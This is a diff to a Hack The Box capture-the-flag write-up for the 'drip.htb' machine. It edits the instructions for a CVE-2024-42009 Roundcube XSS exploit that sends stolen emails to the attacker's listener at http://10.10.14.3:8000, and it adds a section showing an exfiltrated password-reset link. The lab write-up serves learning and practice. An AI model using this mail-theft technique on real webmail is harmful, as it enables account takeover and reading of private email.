@@ -90,7 +90,7 @@ An email `bcase@drip.htb` is discovered that can be used for the XSS exploit:
 
 Found exploit code for CVE-2024-42009:
 1. Adjust `http://10.10.14.3:8000` to kali IP address to reflect the information to correct location
-2. Adjust `message = 2` to change the UID of the email to be retrieve by `?_task=mail&_action=show&_uid=`
+2. Adjust `message = 2` to change the UID of the email to retrieve by `?_task=mail&_action=show&_uid=`
 
 ```python
 import requests
@@ -219,3 +219,25 @@ If you encounter any issues or have feedback, let me know so I can address them 
 
 Thanks
 ```
+
+### 2.3. Getting access to `dev-a3f1-01.drip.htb`
+
+![](https://github.com/user-attachments/assets/706d9d12-dd8e-4988-9b62-48e3b912e8bb)
+
+![](https://github.com/user-attachments/assets/91727468-5214-43a8-ba57-d31ada02e822)
+
+![](https://github.com/user-attachments/assets/4bc048cf-0899-46ac-97c9-f7675e4b510c)
+
+Adjust `message = 3` to change the UID of the email to retrieve and get the password reset URL:
+
+```console
+[+] Extracted Message Body Content:
+
+Your reset token has generated.  Please reset your password within the next 5 minutes.
+
+You may reset your password here: http://dev-a3f1-01.drip.htb/reset/ImJjYXNlQGRyaXAuaHRiIg.aMTMMg.l-r8fRl37TG9zNEF9l-ZG4W_XwA
+```
+
+![](https://github.com/user-attachments/assets/2a17c94a-5c16-4cd1-97b0-3d2be55369fb)
+
+![](https://github.com/user-attachments/assets/55d9d9f5-86fb-49b9-8272-beb6f2255af8)
